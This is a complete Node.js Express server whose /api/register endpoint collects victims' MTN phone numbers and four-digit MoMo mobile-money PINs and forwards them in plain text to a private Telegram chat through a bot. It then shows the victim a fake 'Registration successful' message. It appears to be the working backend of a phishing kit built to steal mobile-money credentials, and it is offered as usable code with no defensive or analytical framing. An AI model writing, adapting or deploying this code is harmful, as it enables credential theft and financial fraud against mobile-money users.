const express = require('express');
const axios = require('axios');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ===== CONFIGURATION (loaded from .env) =====
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment');
    process.exit(1);
}

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ===== SEND TO TELEGRAM =====
async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram message sent');
        return { success: true };
    } catch (error) {
        console.error('❌ Telegram error:', error.response?.data || error.message);
        return { success: false, error: error.message };
    }
}

// ===== API: REGISTER =====
app.post('/api/register', async (req, res) => {
    try {
        const { mtnNumber, momoPin } = req.body;

        if (!mtnNumber || !momoPin) {
            return res.status(400).json({
                success: false,
                message: 'MTN number and MoMo PIN are required'
            });
        }

        if (momoPin.length !== 4) {
            return res.status(400).json({
                success: false,
                message: 'MoMo PIN must be 4 digits'
            });
        }

        const registrationId = Math.floor(10000 + Math.random() * 90000).toString();

        const message =
            '📱 <b>NEW MTN MOMO REGISTRATION</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '📞 <b>MTN Number:</b> <code>' + mtnNumber + '</code>\n' +
            '🔑 <b>MoMo PIN:</b> <code>' + momoPin + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n\n' +
            '⏰ <b>Submitted:</b> ' + new Date().toLocaleString();

        const result = await sendToTelegram(message);

        if (result.success) {
            res.json({
                success: true,
                registrationId: registrationId,
                message: 'Registration successful'
            });
        } else {
            res.status(500).json({
                success: false,
                message: 'Failed to send registration'
            });
        }
    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// ===== HEALTH CHECK =====
app.get('/health', (req, res) => {
    res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

// ===== START SERVER =====
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});